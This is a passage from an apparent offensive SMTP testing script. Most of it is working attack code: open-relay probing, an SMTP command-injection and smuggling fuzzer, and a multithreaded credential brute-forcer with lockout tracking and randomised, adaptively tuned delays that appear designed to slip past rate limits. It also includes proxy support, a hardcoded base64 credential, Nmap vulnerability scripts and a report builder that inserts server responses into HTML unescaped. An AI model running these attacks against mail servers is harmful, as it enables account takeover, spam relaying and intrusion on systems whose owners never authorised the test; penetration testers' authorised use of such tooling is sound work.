        for to_email in probe_to_emails: # Test against known external targets
            if found_open_relay: break # Stop if already found one
            server = None
            try:
                server = connect_smtp(target, port)
                if not server:
                    logging.warning(f"Could not connect for open relay check: {from_email} -> {to_email}")
                    continue
                try:
                    server.mail(from_email)
                    server.rcpt(to_email) # This will raise SMTPRecipientsRefused if denied
                    # If these lines execute without exception, it's an open relay (or accepts for local delivery from external)
                    print(f"[!!!] Open Relay detected! Accepted {from_email} -> {to_email}")
                    logging.critical(f"Open Relay detected: {from_email} -> {to_email}")
                    found_open_relay = True
                    break
                except smtplib.SMTPRecipientsRefused as e:
                    logging.debug(f"Open Relay check rejected for {from_email} -> {to_email}: {e.smtp_code} {e.smtp_error.decode()}")
                except smtplib.SMTPException as e:
                    logging.warning(f"SMTP error during open relay check ({from_email} -> {to_email}): {e}")
                except Exception as e:
                    logging.error(f"General error during open relay check ({from_email} -> {to_email}): {e}")
            finally:
                if server:
                    try: server.quit()
                    except: pass
                time.sleep(random.uniform(current_burst_delay, current_burst_delay * 3)) # Small delay after each attempt
    return found_open_relay

def test_smtp_injection_fuzzing(target: str, port: int = 25) -> List[Dict[str, str]]:
    """
    Tests for SMTP Command Injection/Smuggling using various malformed and injection payloads.
    Analyzes server responses for anomalies.
    """
    results = [] # List of {'payload': str, 'response': str, 'type': str}
    print(f"\n[*] Starting SMTP Command Injection and Fuzzing tests on {target}:{port}...")
    
    # Define common SMTP commands to fuzz their arguments and context
    smtp_commands = [
        ("HELO", "test.com"), ("EHLO", "test.com"),
        ("MAIL FROM:", "<test@example.com>"),
        ("RCPT TO:", "<test@example.com>"),
        ("DATA", ""),
        ("AUTH PLAIN", "VXNlcjExOkxvbGxhYnllMTIz"), # Base64 for User11:Lollabye123
        ("RSET", ""), ("QUIT", "")
    ]
    
    total_tests = len(smtp_commands) * sum(len(v) for v in FUZZING_PAYLOADS.values())
    test_count = 0

    for cmd, default_arg in smtp_commands:
        for p_type, payloads in FUZZING_PAYLOADS.items():
            for payload_bytes in payloads:
                test_count += 1
                payload_str = payload_bytes.decode('latin-1', errors='ignore') # For logging/display
                full_command_bytes = None # This will hold the complete command to send
                log_display_cmd = ""

                # --- Construct the command based on context and payload type ---
                if cmd == "DATA":
                    # For DATA smuggling, we construct a full mini-session for injection
                    # This simulates sending a message and trying to inject more commands inside DATA or after its termination
                    full_command_bytes = b"HELO " + get_random_ehlo_domain().encode() + b"\r\n" \
                                       + b"MAIL FROM:<test@attacker.com>\r\n" \
                                       + b"RCPT TO:<test@victim.com>\r\n" \
                                       + b"DATA\r\n" \
                                       + b"Subject: Fuzz Test\r\n" \
                                       + b"\r\n" \
                                       + b"This is a fuzzed message body.\r\n" \
                                       + payload_bytes + b"\r\n" \
                                       + b".\r\n"
                    log_display_cmd = "SMUGGLE(DATA)"
                elif cmd == "AUTH PLAIN":
                    full_command_bytes = b"AUTH PLAIN " + payload_bytes + b"\r\n"
                    log_display_cmd = f"AUTH PLAIN(FUZZ)"
                else: # Fuzz arguments of standard commands
                    full_command_bytes = f"{cmd} {default_arg}{payload_str}\r\n".encode('latin-1', errors='ignore')
                    log_display_cmd = f"{cmd}(FUZZ)"

                if full_command_bytes is None: continue # Skip if no command could be formed

                sock = None
                try:
                    sock = create_raw_socket(target, port, DEFAULT_TIMEOUT)
                    # Read initial banner
                    banner_raw = _read_smtp_response(sock)
                    if not banner_raw.startswith('220'):
                        logging.warning(f"Unexpected banner response for fuzzing: {banner_raw.strip()}")
                    
                    sock.sendall(full_command_bytes)
                    response_raw = _read_smtp_response(sock)
                    
                    response_code = response_raw.split(' ')[0] if response_raw and response_raw.split(' ')[0].isdigit() else "000"
                    
                    if response_code in ["250", "354"] and (p_type != "smuggling_data" or log_display_cmd != "SMUGGLE(DATA)"):
                        # If the server accepts (250) or prompts for data (354) for malformed input, it's interesting
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'AcceptedMalformed', 'command': cmd})
                        print(f"[!!!] Accepted Malformed: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.warning(f"Accepted Malformed: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                    elif response_code.startswith("5") and not response_code in ["500", "501", "503", "504"]:
                        # Unexpected 5XX error that isn't a simple syntax error
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'UnexpectedError', 'command': cmd})
                        print(f"[!!!] Unexpected Error: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.warning(f"Unexpected Error: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                    elif "debug" in response_raw.lower() or "stack trace" in response_raw.lower():
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'DebugInfoLeak', 'command': cmd})
                        print(f"[!!!] Debug Info Leak: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.critical(f"Debug Info Leak: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")
                    elif log_display_cmd == "SMUGGLE(DATA)" and ("250" in response_raw or "221" in response_raw): # If a new SMTP command was prematurely processed
                        results.append({'payload': payload_str, 'response': response_raw, 'type': 'SMTP_Smuggling', 'command': cmd})
                        print(f"[!!!] SMTP Smuggling Likely: Cmd='{cmd}' Payload='{payload_str}' Resp='{response_raw[:70]}'")
                        logging.critical(f"SMTP Smuggling Likely: {cmd}, Payload:{payload_str}, Resp:{response_raw.strip()}")

                except smtplib.SMTPServerDisconnected:
                    results.append({'payload': payload_str, 'response': 'Disconnected', 'type': 'ServerDisconnected', 'command': cmd})
                    print(f"[!!!] Server Disconnected during Fuzzing: Cmd='{cmd}' Payload='{payload_str}'")
                    logging.critical(f"Server Disconnected: {cmd}, Payload:{payload_str}")
                except socket.timeout:
                    results.append({'payload': payload_str, 'response': 'Timeout', 'type': 'Timeout', 'command': cmd})
                    print(f"[!!!] Fuzzing Timeout: Cmd='{cmd}' Payload='{payload_str}'")
                    logging.warning(f"Fuzzing Timeout: {cmd}, Payload:{payload_str}")
                except Exception as e:
                    results.append({'payload': payload_str, 'response': str(e), 'type': 'PythonError', 'command': cmd})
                    logging.error(f"Error during fuzzing {log_display_cmd} with '{payload_str}': {e}")
                time.sleep(random.uniform(current_burst_delay / 2, current_burst_delay)) # Rapid fuzzing

                sys.stdout.write(f"\rTesting Fuzzing: {test_count}/{total_tests} completed. Found {len(results)} anomalies.")
                sys.stdout.flush()

            sys.stdout.write("\n") # Newline after each command category

    print(f"\n[*] Fuzzing completed. Found {len(results)} potential anomalies.")
    return results


# --- Brute Force ---
def brute_force_aggressive(target: str, port: int, users: List[str], passwords: List[str], use_tls: bool = False, max_workers: int = 5) -> Tuple[List[Tuple[str, str]], Dict[str, List[float]]]:
    """
    Aggressive brute force supporting multiple AUTH methods and concurrency with adaptive delays.
    Monitors for account lockouts. Returns successful logins and timing data.
    """
    successful_logins = []
    account_lockouts = {} # {username: timestamp}
    shared_lock = threading.Lock()
    timing_data: Dict[str, List[float]] = {'success': [], 'fail': [], 'auth_error': []}

    print(f"\n[*] Starting aggressive brute force on {target}:{port} with {len(users)} users, {len(passwords)} passwords, {max_workers} concurrent workers.")

    def _attempt_login(user: str, password: str):
        if user in account_lockouts and (time.time() - account_lockouts[user]) < 300: # 5 min lockout
            logging.info(f"Skipping {user}: Temporarily locked out.")
            return None

        server = None
        start_time = time.time()
        response_code_prefix = 0
        try:
            server = connect_smtp(target, port, use_tls)
            if not server:
                with shared_lock:
                    timing_data['fail'].append(time.time() - start_time)
                return None
            try:
                server.login(user, password)
                end_time = time.time()
                with shared_lock:
                    print(f"[+] Successful login: {user}:{password}")
                    logging.critical(f"Successful login: {user}:{password}")
                    successful_logins.append((user, password))
                    timing_data['success'].append(end_time - start_time)
                response_code_prefix = 235 # Authentication successful (235 2.7.0 Authentication successful)
            except smtplib.SMTPAuthenticationError as e:
                end_time = time.time()
                response_raw = str(e)
                response_code_prefix = int(response_raw.split(' ')[0]) if response_raw.split(' ')[0].isdigit() else 535 # Default 535
                with shared_lock:
                    print(f"[-] Failed login: {user}:{password} ({e.smtp_code} {e.smtp_error.decode('utf-8').strip()})")
                    logging.info(f"Failed login: {user}:{password} ({e.smtp_code} {e.smtp_error.decode('utf-8').strip()})")
                    timing_data['auth_error'].append(end_time - start_time)
                    if response_code_prefix in [535, 550, 554]: # Common lockout indicators
                        account_lockouts[user] = time.time()
                        logging.warning(f"User {user} might be locked out.")
            except smtplib.SMTPException as e:
                end_time = time.time()
                with shared_lock:
                    logging.error(f"SMTP error login {user}:{password}: {e}")
                    timing_data['fail'].append(end_time - start_time)
            except Exception as e:
                end_time = time.time()
                with shared_lock:
                    logging.error(f"Unexpected error during brute force {user}:{password}: {e}")
                    timing_data['fail'].append(end_time - start_time)
            finally:
                if server:
                    try: server.quit()
                    except: pass
                # Dynamically adjust delay based on response time/results
                if ML_AVAILABLE and end_time: # Only if ML available and attempt completed
                    anomaly_score = classify_response_anomaly(end_time - start_time, response_code_prefix)
                    adjust_attack_delay(anomaly_score)
                time.sleep(random.uniform(current_burst_delay, current_burst_delay * 2)) # Keep this rate-limited
        except Exception as e: # Connection error specific to this attempt
            with shared_lock:
                logging.error(f"Connection error during brute force for {user}:{password}: {e}")
            if server:
                try: server.quit()
                except: pass
        return None

    # Use ThreadPoolExecutor for concurrent execution
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for user in users:
            for password in passwords:
                futures.append(executor.submit(_attempt_login, user, password))
        
        # Monitor progress (optional, but good for large runs)
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            sys.stdout.write(f"\rBrute Force Progress: {i+1}/{len(futures)} attempts. Found {len(successful_logins)} valid credentials.")
            sys.stdout.flush()
        sys.stdout.write("\n") # Newline after progress bar

    return successful_logins, timing_data


# --- Modern Protocol Compliance & Cloud Identity Checks ---
if NETWORK_EXTRAS_AVAILABLE:
    def check_mta_sts(domain: str) -> Dict[str, Any]:
        """Checks for MTA-STS policy via DNS TXT and HTTPs fetch."""
        mta_sts_results = {'enabled': False, 'policy_fetched': False, 'valid_policy': False, 'notes': []}
        print(f"\n[*] Checking MTA-STS for {domain}...")
        try:
            # 1. Check for TXT record
            txt_records = [r.to_text() for r in dns.resolver.resolve(f"_mta-sts.{domain}", "TXT")] # Use to_text()
            mta_sts_txt_found = False
            for txt_str in txt_records:
                # Remove quotes from TXT record data
                txt_str = txt_str.strip('"')
                if "v=STSv1" in txt_str and "id=" in txt_str:
                    mta_sts_txt_found = True
                    mta_sts_results['enabled'] = True
                    mta_sts_results['notes'].append(f"Found MTA-STS TXT record: {txt_str}")
                    break
            if not mta_sts_txt_found:
                mta_sts_results['notes'].append("No valid MTA-STS TXT record found.")
                return mta_sts_results

            # 2. Fetch policy file via HTTPS with requests (can handle proxies)
            policy_url = f"https://mta-sts.{domain}/.well-known/mta-sts.txt"
            session = requests.Session()
            if SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'socks5':
                session.proxies = {'https': f'socks5h://{PROXY_SETTINGS["host"]}:{PROXY_SETTINGS["port"]}'}
            elif SOCKS_AVAILABLE and PROXY_SETTINGS['host'] and PROXY_SETTINGS['type'] == 'http':
                session.proxies = {'https': f'http://{PROXY_SETTINGS["host"]}:{PROXY_SETTINGS["port"]}'} # HTTP proxy too
            try:
                response = session.get(policy_url, timeout=DEFAULT_TIMEOUT, verify=False) # verify=False for pentesting
                if response.status_code == 200:
                    mta_sts_results['policy_fetched'] = True
                    policy_content = response.text
                    mta_sts_results['notes'].append(f"MTA-STS Policy fetched from {policy_url}:\n---\n{policy_content.strip()}\n---")
                    # Minimal parsing to check policy validity
                    if "version: STSv1" in policy_content and "mode:" in policy_content and "mx:" in policy_content:
                        mta_sts_results['valid_policy'] = True
                        mta_sts_results['notes'].append("MTA-STS policy content appears valid.")
                    else:
                        mta_sts_results['notes'].append("MTA-STS policy content seems invalid or incomplete.")
                else:
                    mta_sts_results['notes'].append(f"Failed to fetch MTA-STS policy from {policy_url}. Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                mta_sts_results['notes'].append(f"Error fetching MTA-STS policy: {e}")
        except dns.resolver.NXDOMAIN:
            mta_sts_results['notes'].append("MTA-STS TXT record (_mta-sts.domain) not found (NXDOMAIN).")
        except dns.resolver.NoAnswer:
            mta_sts_results['notes'].append("No MTA-STS TXT records found for the domain.")
        except Exception as e:
            mta_sts_results['notes'].append(f"An unexpected error occurred during MTA-STS check: {e}")
        return mta_sts_results

    def check_dane(domain: str, port: int = 25) -> Dict[str, Any]:
        """Checks for DANE TLSA records."""
        dane_results = {'enabled': False, 'tlsa_records': [], 'notes': []}
        print(f"\n[*] Checking DANE/TLSA for {domain} on port {port}...")
        try:
            query_name = f"_{port}._tcp.{domain}"
            # Ensure the domain is resolvable to get accurate results
            try:
                socket.gethostbyname(domain)
            except socket.gaierror:
                dane_results['notes'].append(f"Cannot resolve domain {domain}. Skipping DANE check.")
                return dane_results

            tlsa_records = dns.resolver.resolve(query_name, "TLSA")
            if tlsa_records:
                dane_results['enabled'] = True
                for rdata in tlsa_records:
                    dane_results['tlsa_records'].append(str(rdata))
                    dane_results['notes'].append(f"Found DANE TLSA record: {rdata}")
                print(f"[+] DANE TLSA records found for {domain}:{port}.")
            else:
                dane_results['notes'].append(f"No DANE TLSA records found for {query_name}.")
                print(f"[-] No DANE TLSA records found for {domain}:{port}.")
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            dane_results['notes'].append(f"No DANE TLSA records (NXDOMAIN/NoAnswer) for {query_name}.")
            print(f"[-] No DANE TLSA records found for {domain}:{port}.")
        except Exception as e:
            dane_results['notes'].append(f"Error checking DANE: {e}")
            print(f"[-] Error checking DANE for {domain}:{port}: {e}")
        return dane_results

    def identify_cloud_smtp_provider(target_ip_or_hostname: str) -> Optional[str]:
        """
        Identifies if the target SMTP server is hosted on a known cloud provider
        or if it's a dedicated SMTP SaaS.
        """
        print(f"\n[*] Identifying cloud provider for {target_ip_or_hostname}...")
        try:
            ip_addresses = []
            if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", target_ip_or_hostname): # Is it already an IP?
                ip_addresses.append(target_ip_or_hostname)
            else:
                # Resolve hostname to IP(s)
                addr_info = socket.getaddrinfo(target_ip_or_hostname, None)
                ip_addresses.extend([info[4][0] for info in addr_info if info[0] == socket.AF_INET])
            
            if not ip_addresses: return None

            for ip in ip_addresses:
                try:
                    # Attempt reverse DNS lookup
                    hostname, _, _ = socket.gethostbyaddr(ip)
                    if "amazonaws.com" in hostname or "aws.eu" in hostname: return f"AWS SES ({hostname})"
                    if "azure.com" in hostname or "static.microsoft" in hostname: return f"Azure SMTP ({hostname})"
                    if "google.com" in hostname or "gcp.gserviceaccount" in hostname: return f"Google Cloud SMTP ({hostname})"
                    if "sendgrid.net" in hostname: return f"SendGrid ({hostname})"
                    if "mailgun.org" in hostname: return f"Mailgun ({hostname})"
                    if "outlook.com" in hostname or "protection.outlook.com" in hostname: return f"Microsoft 365 Exchange Online ({hostname})"
                    if "cloudflare.com" in hostname: return f"Cloudflare ({hostname})"
                    
                    logging.debug(f"Reverse DNS for {ip}: {hostname}")

                except socket.herror:
                    logging.debug(f"No reverse DNS entry for {ip}.")
                
                # Further check IP ranges against known cloud ranges (requires pre-compiled data, beyond script scope for now)
                # Could integrate an offline database for this or publicly available lists.

            return None # No known cloud provider identified
        except Exception as e:
            logging.error(f"Error identifying cloud SMTP provider for {target_ip_or_hostname}: {e}")
            return None


# --- CVE Specific Checks ---
def _check_known_cves(banner: Optional[str], ehlo_extensions: List[str], open_relay_detected: bool, injection_findings: List[Dict[str, str]]) -> List[str]:
    """
    Checks the collected information against a simple database of known SMTP CVEs/weaknesses.
    Supports basic version matching and feature checks.
    """
    found_vulnerabilities = []

    # Helper to parse and compare version strings, handling common formats
    def parse_version(version_string):
        # Cleans and standardizes version string for comparison
        return [int(v) for v in version_string.split('.')]

    def compare_versions(v1, operator, v2):
        parsed_v1 = parse_version(v1)
        parsed_v2 = parse_version(v2)

        for i in range(max(len(parsed_v1), len(parsed_v2))):
            val1 = parsed_v1[i] if i < len(parsed_v1) else 0
            val2 = parsed_v2[i] if i < len(parsed_v2) else 0

            if operator == '<': return val1 < val2
            if operator == '<=': return val1 <= val2
            if operator == '>': return val1 > val2
            if operator == '>=': return val1 >= val2
            if operator == '==': return val1 == val2
            if operator == '!=': return val1 != val2
            
            if val1 != val2: break # Only if operator is not equality
        return True if operator in ['==', '<=', '>='] and val1 == val2 else False # For ==, <=, >=, if all components match

    for cve_id, cve_details in KNOWN_SMTP_CVES.items():
        is_vulnerable = False
        
        # 1. Product and Version Identification
        product_version_match = None
        if banner and cve_details.get("product_regex_pattern"):
            match = re.search(cve_details["product_regex_pattern"], banner, re.IGNORECASE)
            if match:
                # Assuming group 1 is the main version number, adjust regex if more complex
                product_version_match = match.group(match.lastindex) if match.lastindex else None

        if product_version_match and cve_details.get("vulnerable_versions_range"):
            for min_v, max_v in cve_details["vulnerable_versions_range"]:
                min_match = True
                max_match = True

                if min_v: # Check lower bound like ">=4.96"
                    operator = min_v[0:2] if min_v.startswith(('<', '>', '=', '!')) else '>=' # Default to >=
                    version_to_compare = min_v[2:] if min_v.startswith(('<', '>', '=', '!')) else min_v
                    min_match = compare_versions(product_version_match, operator, version_to_compare)
                
                if max_v: # Check upper bound like "<=4.98.1"
                    operator = max_v[0:2] if max_v.startswith(('<', '>', '=', '!')) else '<=' # Default to <=
                    version_to_compare = max_v[2:] if max_v.startswith(('<', '>', '=', '!')) else max_v
                    max_match = compare_versions(product_version_match, operator, version_to_compare)

                if min_match and max_match:
                    is_vulnerable = True
                    break # Found a matching range

        # 2. Feature-based checks (independent of version, or in addition to)
        if "VRFY" in cve_details.get("vulnerable_features", []) and ("VRFY" in ehlo_extensions or "250-VRFY" in ehlo_extensions):
            is_vulnerable = True # VRFY is explicitly supported and could be vulnerable

        if "EXPN" in cve_details.get("vulnerable_features", []) and ("EXPN" in ehlo_extensions or "250-EXPN" in ehlo_extensions):
            is_vulnerable = True # EXPN is explicitly supported and could be vulnerable
        
        if "OPEN_RELAY" in cve_details.get("vulnerable_features", []) and open_relay_detected:
            is_vulnerable = True
        
        if "COMMAND_INJECTION" in cve_details.get("vulnerable_features", []) and injection_findings:
            is_vulnerable = True
        
        if "SMTP_SMUGGLING" in cve_details.get("vulnerable_features", []) and injection_findings:
            is_vulnerable = True
        
        # Additional feature matches or general logic (e.g. "SPOOFING", "XSS")
        # For these, the script's specific tests for them would feed into is_vulnerable = True
        # For 'SPOOFING', DMARC/SPF/DKIM checks would be included, but that's not explicitly in this _check_known_cves context.
        # For 'XSS', actual web vuln scans for web interfaces would be needed.

        if is_vulnerable:
            found_vulnerabilities.append({
                "cve_id": cve_id,
                "description": cve_details['description'],
                "recommendation": cve_details['recommendation'],
                "impact": cve_details['impact']
            })
            logging.warning(f"CVE Match: {cve_id} - {cve_details['description']} (Version: {product_version_match} if applicable)")

    return found_vulnerabilities


# --- Nmap Integration ---
def nmap_scan(target: str, port: int) -> Optional[str]:
    """Runs Nmap with more targeted SMTP scripts."""
    # Aggressive Nmap scripts for SMTP. Adding --version-all to get full version details.
    scripts = ["smtp-commands", "smtp-enum-users", "smtp-open-relay", "smtp-vuln-cve2010-0432", "smtp-ntlm-info", "smtp-starttls-detection"] 
    cmd = ["nmap", "-p", str(port), "-sV", "--version-all", "--script", ",".join(scripts), target]
    
    # Nmap is often rate-limited itself, adding a small delay if needed
    # If proxy is used, Nmap needs to be configured (e.g., via NMAP_PROXY env var for http/socks)
    # This script will not auto-configure NMAP_PROXY, user should do it if required.

    print(f"\n[*] Running Nmap command: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True, timeout=300) # 5 min timeout
        output = result.stdout
        print(f"\n[+] Nmap Scan Results for {target}:\n---\n{output}\n---")
        logging.info(f"Nmap Scan Results for {target}:\n{output}")
        return output
    except FileNotFoundError:
        print("[-] Nmap not found. Please install nmap to use this feature.")
        logging.error("Nmap not found.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"[-] Nmap command failed with error: {e.stderr}")
        logging.error(f"Nmap command failed: {e.stderr}")
        return None
    except subprocess.TimeoutExpired:
        print(f"[-] Nmap scan timed out after 5 minutes for {target}.")
        logging.warning(f"Nmap scan timed out for {target}.")
        return "Nmap scan timed out."
    except Exception as e:
        print(f"[-] Error running Nmap: {e}")
        logging.error(f"Error running Nmap: {e}")
        return None


# --- Reporting and Visualization ---
if PLOTTING_AVAILABLE:
    def plot_timing_results(timing_data: Dict[str, List[float]], title: str, filename: str):
        """
        Plots response times for different categories using box plots.
        timing_data: {'Category1': [t1,t2,...], 'Category2': [t3,t4,...]}
        """
        if not timing_data or all(not data_list for data_list in timing_data.values()):
            print(f"[-] No timing data to plot for '{title}'. Skipping graph generation.")
            return

        valid_data_labels = [label for label, data_list in timing_data.items() if data_list]
        valid_data_values = [data_list for data_list in timing_data.values() if data_list]

        if not valid_data_labels:
            print(f"[-] No valid timing data to plot for '{title}'. Skipping graph generation.")
            return

        fig, ax = plt.subplots(figsize=(12, 7))
        bp = ax.boxplot(valid_data_values, labels=valid_data_labels, patch_artist=True, vert=True)
        
        colors = ['#4daf4a', '#e41a1c', '#377eb8', '#ff7f00', '#984ea3'] # Custom colors
        for patch, color in zip(bp['boxes'], colors[:len(valid_data_labels)]):
            patch.set_facecolor(color)

        ax.set_title(title, fontsize=16)
        ax.set_ylabel("Response Time (seconds)", fontsize=12)
        ax.set_xlabel("Event Type", fontsize=12)
        ax.grid(True, linestyle='--', alpha=0.6)
        ax.tick_params(axis='x', rotation=15) # Rotate labels slightly if they overlap

        # Add median values to boxes for clarity
        for line in bp['medians']:
            x, y = line.get_xydata()[1]
            ax.text(x, y * 1.02, f'{y:.4f}', ha='center', va='bottom', fontsize=8, color='black')

        plt.tight_layout() # Adjust layout to prevent labels from overlapping
        try:
            plt.savefig(filename)
            print(f"[+] Saved timing graph to {filename}")
            logging.info(f"Saved timing graph to {filename}")
        except Exception as e:
            print(f"[-] Error saving plot {filename}: {e}")
            logging.error(f"Error saving plot {filename}: {e}")
        finally:
            plt.close(fig) # Close the figure to free up memory
else:
    def plot_timing_results(*args, **kwargs):
        print("[!] matplotlib not installed. Skipping timing graph generation.")


def generate_report(results: Dict[str, Any], target_host: str) -> str:
    """
    Generates a comprehensive HTML report including all findings.
    """
    report_filename = f"smtp_pentest_report_{target_host.replace('.', '_')}_{int(time.time())}.html"
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMTP Penetration Test Report - {results.get('target', 'N/A')}</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; margin: 20px; background-color: #f4f7f6; }}
            .container {{ max-width: 1000px; margin: auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
            h1, h2, h3 {{ color: #0056b3; border-bottom: 2px solid #e0e0e0; padding-bottom: 10px; margin-top: 30px; }}
            h1 {{ text-align: center; color: #004085; font-size: 2.5em; }}
            .section {{ margin-bottom: 25px; background: #fafafa; padding: 20px; border-radius: 5px; border: 1px solid #eee; }}
            .highlight-success {{ color: #28a745; font-weight: bold; }}
            .highlight-warning {{ color: #ffc107; font-weight: bold; }}
            .highlight-critical {{ color: #dc3545; font-weight: bold; }}
            ul {{ list-style-type: none; padding: 0; }}
            ul li {{ background: #e9ecef; margin-bottom: 8px; padding: 10px 15px; border-radius: 4px; }}
            pre {{ background: #e9ecef; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
            th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
            th {{ background-color: #0056b3; color: white; }}
            .image-container {{ text-align: center; margin-top: 20px; }}
            .image-container img {{ max-width: 90%; height: auto; border: 1px solid #ddd; border-radius: 5px; }}
            .footer {{ text-align: center; font-size: 0.9em; color: #777; margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>SMTP Penetration Test Report (2025 Edition)</h1>
            <p style="text-align: center; font-size: 1.1em;"><strong>Target:</strong> {results.get('target', 'N/A')}:{results.get('port', 'N/A')}</p>
            <p style="text-align: center;"><strong>Date:</strong> {time.ctime()}</p>

            <div class="section">
                <h2>I. Executive Summary</h2>
                <p>This report details the findings from an aggressive SMTP penetration test conducted on <code>{results.get('target', 'N/A')}</code>. Key vulnerabilities identified include (summarize criticals here, e.g., Open Relay, User Enumeration, Authentication Bypass).</p>
                <p><strong>Overall Risk:</strong> <span class="{ 'highlight-critical' if results.get('open_relay') or results.get('successful_logins') else ('highlight-warning' if results.get('valid_users_vrfy') or results.get('valid_users_rcpt') or results.get('injection_fuzzing_logs') else 'highlight-success') }">{ 'CRITICAL' if results.get('open_relay') or results.get('successful_logins') else ('HIGH' if results.get('valid_users_vrfy') or results.get('valid_users_rcpt') or results.get('injection_fuzzing_logs') else 'MEDIUM/LOW') }</span></p>
            </div>

            <div class="section">
                <h2>II. Target Information & Capabilities</h2>
                <ul>
                    <li><strong>Banner:</strong> <code>{results.get('banner', 'N/A')}</code></li>
                    <li><strong>TLS Requested:</strong> {results.get('initial_tls_request', False)}</li>
                    <li><strong>STARTTLS Supported:</strong> <span class="{'highlight-success' if results.get('starttls_supported') else 'highlight-warning'}">{results.get('starttls_supported', 'N/A')}</span></li>
                    <li><strong>Supported ESMTP Extensions:</strong> <code>{', '.join(results.get('ehlo_extensions', [])) or 'None'}</code></li>
                    <li><strong>Identified Cloud/SaaS Provider:</strong> {results.get('cloud_provider', 'Not identified as cloud/SaaS')}</li>
                </ul>
            </div>
    """
    if results.get('nmap_output'):
        html_content += f"""
            <div class="section">
                <h2>III. Nmap Scan Results</h2>
                <pre>{results['nmap_output']}</pre>
            </div>
        """

    html_content += f"""
            <div class="section">
                <h2>IV. User Enumeration Findings</h2>
                <h3>Valid Users (VRFY)</h3>
                <ul>{''.join([f'<li>{u}</li>' for u in results.get('valid_users_vrfy', [])]) or '<li>None detected.</li>'}</ul>
                <h3>Valid Users (RCPT TO)</h3>
                <ul>{''.join([f'<li>{u}</li>' for u in results.get('valid_users_rcpt', [])]) or '<li>None detected or confirmed.</li>'}</ul>
                <h3>EXPN Results</h3>
                {'<pre>' + '\\n'.join([f'{k}: {v}' for k,v in results.get('expn_results', {}).items()]) + '</pre>' if results.get('expn_results') else '<ul><li>No relevant EXPN responses.</li></ul>'}
            </div>

            <div class="section">
                <h2>V. Open Relay & Command Vulnerabilities</h2>
                <h3>Open Relay Detection</h3>
                <p><strong>Status:</strong> <span class="{'highlight-critical' if results.get('open_relay') else 'highlight-success'}">{ 'VULNERABLE (Open Relay Detected!)' if results.get('open_relay') else 'Not an Open Relay' }</span></p>
                <h3>SMTP Command Injection / Fuzzing Anomalies</h3>
                {'<ul>' + ''.join([f'<li><strong>Type:</strong> {f.get("type", "N/A")}<br><strong>Command:</strong> <code>{f.get("command", "N/A")}</code><br><strong>Payload:</strong> <code>{f.get("payload", "N/A")}</code><br><strong>Response:</strong> <pre>{f.get("response", "N/A")}</pre></li>' for f in results.get('injection_fuzzing_logs', [])]) + '</ul>' if results.get('injection_fuzzing_logs') else '<ul><li>No significant anomalies detected.</li></ul>'}
            </div>

            <div class="section">
                <h2>VI. Authentication Brute Force</h2>
                <h3>Successful Logins</h3>
                {'<ul>' + ''.join([f'<li><span class="highlight-critical">{u}:{p}</span></li>' for u,p in results.get('successful_logins', [])]) + '</ul>' if results.get('successful_logins') else '<ul><li>No successful logins.</li></ul>'}
                <p><strong>Note:</strong> Brute force attempts were conducted with <span class="highlight-warning">adaptive delays</span> and monitored for potential account lockouts.</p>
            </div>
    """
    if results.get('cve_findings'):
        html_content += f"""
            <div class="section">
                <h2>VII. CVE Specific Findings</h2>
                <table>
                    <thead>
                        <tr><th>CVE ID</th><th>Description</th><th>Impact</th><th>Recommendation</th></tr>
                    </thead>
                    <tbody>
                        {''.join([f'<tr><td>{f.get("cve_id", "N/A")}</td><td>{f.get("description", "N/A")}</td><td><span class="highlight-{f.get("impact", "N/A").lower()}">{f.get("impact", "N/A")}</span></td><td>{f.get("recommendation", "N/A")}</td></tr>' for f in results.get('cve_findings', [])])}
                    </tbody>
                </table>
            </div>
        """
    
    if NETWORK_EXTRAS_AVAILABLE:
        html_content += f"""
            <div class="section">
                <h2>VIII. Modern SMTP Protocol Checks</h2>
                <h3>MTA-STS Compliance</h3>
                <p><strong>Enabled:</strong> <span class="{'highlight-success' if results.get('mta_sts', {}).get('enabled') else 'highlight-warning'}">{results.get('mta_sts', {}).get('enabled', False)}</span></p>
                <p><strong>Policy Fetched:</strong> {results.get('mta_sts', {}).get('policy_fetched', False)}</p>
                <p><strong>Valid Policy:</strong> <span class="{'highlight-success' if results.get('mta_sts', {}).get('valid_policy') else 'highlight-warning'}">{results.get('mta_sts', {}).get('valid_policy', False)}</span></p>
                <p><strong>Notes:</strong></p>
                <ul>{''.join([f'<li>{note}</li>' for note in results.get('mta_sts', {}).get('notes', [])]) or '<li>No specific notes.</li>'}</ul>

                <h3>DANE (TLSA) Compliance</h3>
                <p><strong>Enabled:</strong> <span class="{'highlight-success' if results.get('dane', {}).get('enabled') else 'highlight-warning'}">{results.get('dane', {}).get('enabled', False)}</span></p>
                <p><strong>TLSA Records Found:</strong></p>
